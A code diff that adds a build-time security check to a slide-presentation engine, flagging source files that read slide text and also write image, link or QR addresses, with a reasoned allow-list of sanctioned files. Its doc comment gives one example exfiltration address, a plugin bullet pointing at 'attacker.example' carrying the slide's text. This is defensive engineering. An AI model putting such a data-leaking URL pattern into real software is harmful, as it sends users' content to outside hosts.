@@ -8707,6 +8707,225 @@ function checkRuntimeMarkupSinks(errors, sanctions = SANCTIONED_RUNTIME_MARKUP_S
   }
 }
 
+/**
+ * `checkSlideTextAddressReaders` — the slide-text address rule (spec/LPM.md §10; engineering/decisions/2026-10-16-media-plugins.md §4.5).
+ *
+ * THE RULE. An address the viewer loads or scans (an image, a poster, a mask, a link, a QR code) comes only from the
+ * author's own block: a markdown-it token, an `@kind{…}` record, an element the engine stamped. Never from slide TEXT —
+ * `textContent`, a walk over `<li>`s, a regex over a section's HTML, the runtime's DOM mirror — and never from inside
+ * `[data-lattice-plugin]`, where a plugin's output lands as text. A plugin with no network of its own could otherwise
+ * write `https://attacker.example/?d=<the slide's text>` as a bullet and have one of OUR passes publish it.
+ *
+ * WHAT IT FINDS. A source file that both READS slide text (one of `READ_KINDS`) and WRITES an address (one of
+ * `SINK_KINDS`). The co-occurrence is a census, not a data-flow proof: a file that does both is where a text→address
+ * path can live, so it is written down. Each entry in `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` states its reason and its
+ * GUARD:
+ *   · `masks` — the file must call `maskPluginSubtrees(` or skip `closest('[data-lattice-plugin]')`; the gate checks it
+ *     is there, so deleting the guard fails the build even though the entry still matches;
+ *   · `none`  — the reason says why no plugin text can reach the address (an export reader of a finished document, the
+ *     consent gate that REFUSES addresses, a resolver that maps an address already on the page and never invents one).
+ * The entry pins the exact read and sink kinds it found, so a NEW kind of read or write in a sanctioned file is a new
+ * path to justify, not one certified by the old reason. A stale entry fails, and so does a duplicate.
+ *
+ * ITS ENVELOPE, stated so it is not trusted past its worth: a read and a sink in DIFFERENT files joined by an import
+ * (the QR kernels: `contact.transform.js` reaches text only through `qr-card.js` `parseFields`, which is sanctioned
+ * and masks), a sink spelled through a variable (`el[attr] = v`), and a reader outside the scanned roots. The roots are
+ * `lib/` (vendored copies skipped, as every census here does) and the Studio host files that run over a slide
+ * (`docs/src/playground/*-host.js`). The rest of `docs/src` is the Studio's own chrome: it reads the author's editor,
+ * not a rendered slide, and a pass over slides belongs in `lib/runtime` or `lib/plugins`, where this sees it.
+ * Comments are stripped first (`stripCodeComments`): a sink named only in a comment is not a sink.
+ *
+ * @param {string[]} errors
+ * @param {Array} [sanctions]  injectable, so a probe needs no committed entry
+ * @param {string} [root]      injectable, so a probe lives in a temp tree
+ */
+const SLIDE_TEXT_READ_KINDS = Object.freeze({
+  // A read of a live element's text, not an assignment to it (`+=` and `=` are writes; `==` is a read).
+  'text': /\.(?:textContent|innerText)\b(?!\s*\+?=(?!=))/,
+  // A read of serialized markup: the runtime's DOM halves hand `sec.innerHTML` to the HTML kernels.
+  'html': /\.(?:innerHTML|outerHTML)\b(?!\s*\+?=(?!=))/,
+  // A walk over list items, as a string scan (`'<li'`, `/<li\b/`) or a selector (`'li'`, `querySelectorAll('ul > li')`).
+  'li': /<li(?![a-z-])|['"`]li['"`]|querySelectorAll\(\s*['"`][^'"`]*\bli\b/,
+});
+const SLIDE_TEXT_SINK_KINDS = Object.freeze({
+  'qr': /\bqrSvg\s*\(/,
+  'property': /\.(?:src|href|srcset|poster)\s*=(?!=)/,
+  'set-attribute': /setAttribute\(\s*['"`](?:src|href|srcset|poster|xlink:href)['"`]/,
+  'attribute-template': /\b(?:src|href|srcset|poster)=["'][^"'\n]*\$\{|\b(?:src|href|srcset|poster)=["']\s*['"`]\s*\+/,
+  'css-url': /url\(\s*['"]?\$\{|url\(\s*['"]?\s*['"`]\s*\+/,
+});
+// A QR encoder reached as `encode(` counts only in a file that imports one (`./qr`, `qr-card`), so TextEncoder's
+// `encode` elsewhere is not a sink.
+const SLIDE_TEXT_QR_ENCODE = /\bencode\s*\(/;
+const SLIDE_TEXT_QR_IMPORT = /require\(\s*['"][^'"]*(?:\/qr|qr-card)['"]\s*\)|from\s+['"][^'"]*(?:\/qr|qr-card)['"]/;
+const SLIDE_TEXT_GUARD = /\bmaskPluginSubtrees\s*\(|closest\(\s*['"`]\[data-lattice-plugin\]['"`]\s*\)/;
+
+const SANCTIONED_SLIDE_TEXT_ADDRESS_READERS = [
+  {
+    file: 'lib/components/connect/_qr-card/qr-card.js',
+    reads: ['li'],
+    sinks: ['qr'],
+    guard: 'masks',
+    why:
+      '`parseFields` turns a `contact`/`wifi` slide\'s field bullets into a vCard or WIFI: payload, on the engine\'s HTML pass and again on the runtime\'s DOM pass (which hands it the live section\'s innerHTML, plugin output included). It reads them through `maskPluginSubtrees`, so a plugin\'s bullet is never a field. Pinned by test/unit/transformers/plugin-address-mask.test.js.',
+  },
+  {
+    file: 'lib/components/connect/_qr-card/qr-general.transform.js',
+    reads: ['li'],
+    sinks: ['qr'],
+    guard: 'masks',
+    why:
+      'The `qr` variant encodes the slide\'s link bullet. `renderSection` reads the bullets through `maskPluginSubtrees` (length-preserving, so its splice offsets still index the slide), on both the HTML pass and the runtime\'s DOM pass, so a plugin\'s link is never the payload. Pinned by test/unit/transformers/plugin-address-mask.test.js and the shared fence-door fixture.',
+  },
+  {
+    file: 'lib/components/imagery/collage/collage.transform.js',
+    reads: ['html', 'li'],
+    sinks: ['set-attribute'],
+    guard: 'masks',
+    why:
+      'The DOM half pins each photo\'s resolved `img.src` into its attribute before re-serializing the slide; it skips any `<img>` inside `[data-lattice-plugin]`. The rebuild itself only regroups the slide\'s own top-level list, and the address it carries is one the page already loads: it invents none.',
+  },
+  {
+    file: 'lib/components/imagery/video/video.transform.js',
+    reads: ['li'],
+    sinks: ['css-url', 'qr'],
+    guard: 'masks',
+    why:
+      'The poster and the QR come only from the figure the `video` plugin stamped from the author\'s `@video{…}` record (`data-lattice-media-url`, re-validated through `detectProvider`). `takeFigure` finds that figure through `maskPluginSubtrees`, so a figure inside plugin output is never the slide\'s, whatever pass order delivers it. The `<li` read only drops an emptied bullet.',
+  },
+  {
+    file: 'lib/components/inventory/team-profile/team-profile.transform.js',
+    reads: ['html', 'li'],
+    sinks: ['attribute-template', 'set-attribute'],
+    guard: 'masks',
+    why:
+      'The roster rebuild re-emits each person\'s existing `<img src>` (an address the page already loads) from the stage\'s DIRECT-child lists only, so a plugin\'s list inside its root is never a roster. The DOM half\'s pin loop skips an `<img>` inside `[data-lattice-plugin]`.',
+  },
+  {
+    file: 'lib/core/bg-image.js',
+    reads: ['text'],
+    sinks: ['css-url'],
+    guard: 'none',
+    why:
+      'The `text` read is `wrapImageText`\'s empty-fold check, which only decides whether to wrap. The `url()` writes are `liftBgImages` (the author\'s `![bg]` markdown, rewritten in the SOURCE before the render) and `resolveInlineImageSrcs`, which maps an address already in the page to the same file and never invents one. The door drops any address a plugin invents (lib/core/door-attr.mjs `doorFilterAttr`) before this pass sees the page.',
+  },
+  {
+    file: 'lib/core/pdf-compose/read-slide.mjs',
+    reads: ['text'],
+    sinks: ['property'],
+    guard: 'none',
+    why:
+      'The PDF composer reads the FINISHED page to lay its text out as PDF glyphs; its one address write (`naturalSizeOf`, `im.src = url`) measures a background image the page already loaded, under the CLI\'s offline Chromium (lib/core/offline-chromium.js). It builds no address from text.',
+  },
+  {
+    file: 'lib/core/remote-ref.js',
+    reads: ['html', 'text'],
+    sinks: ['attribute-template'],
+    guard: 'none',
+    why:
+      '`blockWebImages` is the web-image consent gate: it REFUSES addresses. Its attribute writes are the drawn placeholder (`WEB_IMAGE_PLACEHOLDER`) and the `data-lattice-web-src` record of the address it took away; its text reads rewrite a refused `url()` inside a `<style>`. It runs last over the whole page, plugin output included, which is the point: a plugin\'s own picture cannot load without the reader\'s consent.',
+  },
+  {
+    file: 'lib/core/slide-camera.mjs',
+    reads: ['text'],
+    sinks: ['css-url', 'property', 'set-attribute'],
+    guard: 'none',
+    why:
+      'The slide camera rasterizes a clone of a finished slide: it absolutizes addresses the slide ALREADY loads (an `<img src>`, a `url()` in a `<style>`, whose `textContent` is the text it reads) and inlines a live canvas as a data: URL. It reads no slide text into an address and invents none.',
+  },
+  {
+    file: 'lib/export/player-core.mjs',
+    reads: ['html', 'li', 'text'],
+    sinks: ['attribute-template', 'property', 'set-attribute'],
+    guard: 'none',
+    why:
+      'The exported player\'s writes are: a narration clip from the deck\'s own audio manifest (`a.src = clip.a`); the consent banner\'s links and its loader, which take only `data-lattice-web-src` values that `blockWebImages` recorded and only for origins the author declared (a plugin cannot write a `data-lattice-*` attribute it was not handed, `doorFilterAttr`); and the outline\'s `#id` links. Its text reads build labels. The player\'s CSP (`img-src data:`/`blob:`) holds the rest.',
+  },
+  {
+    file: 'lib/runtime/index.js',
+    reads: ['li', 'text'],
+    sinks: ['property'],
+    guard: 'masks',
+    why:
+      'The runtime\'s one address write loads OUR plugin-data script beside the runtime (a fixed first-party file, `new URL(p.file, src)`); slide text only decides WHETHER it loads, and the probe skips any `<code>` inside `[data-lattice-plugin]`, so a plugin\'s text decides nothing. The inline-pill mirror (`transformInlinePills`) skips plugin output and never dispatches an address-bearing kind.',
+  },
+  {
+    file: 'lib/transformers/logo-marks.js',
+    reads: ['html'],
+    sinks: ['css-url'],
+    guard: 'masks',
+    why:
+      'A `logo-wall` mark re-emits an existing `<img src>` (an address the page already loads) as `--logo-mask:url(…)`. The DOM half skips an `<img>` inside `[data-lattice-plugin]`; the HTML half runs before the door draws (the door is the registry\'s last slot).',
+  },
+  {
+    file: 'lib/transformers/prose-projection.mjs',
+    reads: ['html', 'li', 'text'],
+    sinks: ['attribute-template', 'css-url'],
+    guard: 'masks',
+    why:
+      'The Reading view projects a slide into prose. Its text reads build labels and captions; its one address is the video card\'s poster and link, taken only from the `video` plugin\'s own figure and never one inside `[data-lattice-plugin]` (`videoCard`); its `url(#…)` rewrites only suffix in-page ids.',
+  },
+];
+
+/** Every scanned file's read and sink kinds, for the files that hold at least one of each. @returns {Map<string, {reads: string[], sinks: string[], guarded: boolean}>} */
+function slideTextAddressCensus(root = ROOT) {
+  const files = [];
+  listSourceFiles(path.join(root, 'lib'), files);
+  const pg = path.join(root, 'docs', 'src', 'playground');
+  if (fs.existsSync(pg)) for (const f of fs.readdirSync(pg)) if (/-host\.[cm]?js$/.test(f)) files.push(path.join(pg, f));
+  const out = new Map();
+  for (const file of files) {
+    const rel = relPosix(root, file);
+    if (!/\.[cm]?[jt]s$/.test(rel) || /\.generated\.[cm]?js$/.test(rel) || /\.test\.[cm]?[jt]s$/.test(rel) || /\.d\.ts$/.test(rel)) continue;
+    const code = stripCodeComments(fs.readFileSync(file, 'utf8'));
+    const reads = Object.keys(SLIDE_TEXT_READ_KINDS).filter((k) => SLIDE_TEXT_READ_KINDS[k].test(code));
+    if (!reads.length) continue;
+    const sinks = Object.keys(SLIDE_TEXT_SINK_KINDS).filter((k) => SLIDE_TEXT_SINK_KINDS[k].test(code));
+    if (!sinks.includes('qr') && SLIDE_TEXT_QR_ENCODE.test(code) && SLIDE_TEXT_QR_IMPORT.test(code)) sinks.push('qr');
+    if (!sinks.length) continue;
+    out.set(rel, { reads, sinks: sinks.sort(), guarded: SLIDE_TEXT_GUARD.test(code) });
+  }
+  return out;
+}
+
+function checkSlideTextAddressReaders(errors, sanctions = SANCTIONED_SLIDE_TEXT_ADDRESS_READERS, root = ROOT) {
+  const found = slideTextAddressCensus(root);
+  const declared = new Map();
+  for (const s of sanctions) {
+    if (declared.has(s.file)) {
+      errors.push(`SANCTIONED_SLIDE_TEXT_ADDRESS_READERS has a duplicate entry for ${s.file}: one silently shadows the other. Merge them.`);
+      continue;
+    }
+    declared.set(s.file, s);
+    if (s.guard !== 'masks' && s.guard !== 'none') errors.push(`SANCTIONED_SLIDE_TEXT_ADDRESS_READERS: ${s.file} has guard ${JSON.stringify(s.guard)}; it is 'masks' or 'none'.`);
+    if (typeof s.why !== 'string' || s.why.trim().length < 60) errors.push(`SANCTIONED_SLIDE_TEXT_ADDRESS_READERS: ${s.file} needs its justification in \`why\` (HARD RULE #22 posture: an entry goes in WITH its reason).`);
+  }
+  for (const [rel, hit] of found) {
+    const entry = declared.get(rel);
+    const sig = `reads ${hit.reads.join('+')}, writes ${hit.sinks.join('+')}`;
+    if (!entry) {
+      errors.push(
+        `${rel} reads slide text and writes an address (${sig}), and is not in SANCTIONED_SLIDE_TEXT_ADDRESS_READERS ` +
+        `(spec/LPM.md §10). An address the viewer loads or scans comes only from the author's own block, never from slide ` +
+        `text and never from inside [data-lattice-plugin]. Read the address from the markdown token or the element the ` +
+        `engine stamped; if the file must read rendered text, read it through \`maskPluginSubtrees\` (HTML) or skip ` +
+        `\`closest('[data-lattice-plugin]')\` (DOM) and add an entry with guard 'masks' and its reason.`,
+      );
+      continue;
+    }
+    const want = `reads ${[...entry.reads].sort().join('+')}, writes ${[...entry.sinks].sort().join('+')}`;
+    if (want !== `reads ${[...hit.reads].sort().join('+')}, writes ${hit.sinks.join('+')}`) {
+      errors.push(`${rel} now ${sig}; SANCTIONED_SLIDE_TEXT_ADDRESS_READERS declares it ${want}. A new kind of read or write is a new path from text to an address: justify it in the entry, or remove it.`);
+    }
+    if (entry.guard === 'masks' && !hit.guarded) {
+      errors.push(`${rel} is sanctioned with guard 'masks' but no longer calls maskPluginSubtrees( or skips closest('[data-lattice-plugin]'): a plugin's output would be read as an address (spec/LPM.md §10).`);
+    }
+  }
+  for (const [rel] of declared) {
+    if (!found.has(rel)) errors.push(`SANCTIONED_SLIDE_TEXT_ADDRESS_READERS has a stale entry: ${rel} no longer reads slide text and writes an address. Remove it so the list keeps describing the tree.`);
+  }
+}
+
 // HARD RULE #22, part 2 — the returning-visitor SNAPSHOT is a SECOND untrusted-HTML path,
 // but a MAIN-DOCUMENT one the srcdoc-builder check above can't see: the Studio caches the
 // last rendered slide's HTML in localStorage and `studio.astro`'s pre-paint replay injects
@@ -15046,6 +15265,7 @@ function run() {
   checkLineEndingBoundaries(errors);
   checkPreviewHtmlSinks(errors);
   checkRuntimeMarkupSinks(errors);
+  checkSlideTextAddressReaders(errors);
   checkPluginPurity(errors);
   checkPluginMigration(errors);
   checkSnapshotHtmlSinks(errors);
@@ -15304,6 +15524,8 @@ module.exports = {
   checkDocumentStyleSinks,
   checkCssTreeRewrapSinks,
   checkRuntimeMarkupSinks,
+  checkSlideTextAddressReaders,
+  slideTextAddressCensus,
   checkSecuritySpineCensus,
   checkFlakyTests,
   checkRegexCensus,
@@ -15354,6 +15576,7 @@ module.exports = {
   listFilesByExt,
   SANCTIONED_PREVIEW_BUILDERS,
   SANCTIONED_RUNTIME_MARKUP_SINKS,
+  SANCTIONED_SLIDE_TEXT_ADDRESS_READERS,
   PREVIEW_BUILDER_MARKER,
   SANITIZE_CALL,
   STYLE_SINK_MARKER,
